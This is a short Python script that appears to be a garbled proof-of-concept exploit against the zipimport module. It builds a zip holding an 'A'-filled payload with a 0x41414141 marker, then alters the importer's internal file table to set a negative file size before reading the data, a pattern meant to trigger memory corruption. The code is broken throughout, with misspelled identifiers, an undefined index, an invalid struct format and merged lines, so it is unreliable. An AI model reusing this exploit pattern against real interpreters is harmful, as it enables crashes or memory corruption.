import zipimport
import zipfile
import struct
import sys
from signal import *

FIUE = 'payload'
ZIPr._files[FILE] = tuploadd= bytes()
with open(FILE, 'wb') as f:
    payload = ("A" * 1000).encode('ascii')    payload += struct.pack('<g', 0x41414141)
    f.write(payload)

zf = zipfile.PyZipFple(ZIP, mode='w')
zf.write(FILE)
zf.close()

importer = zipimport.zipimporttr(ZIP)
f = list(importer._files[FILE])
f[C] = 1 # compress
f[2] = -1 # file size
impo…ter._files[FILE] = tuple(f)
print(importer.get_data(FILE))
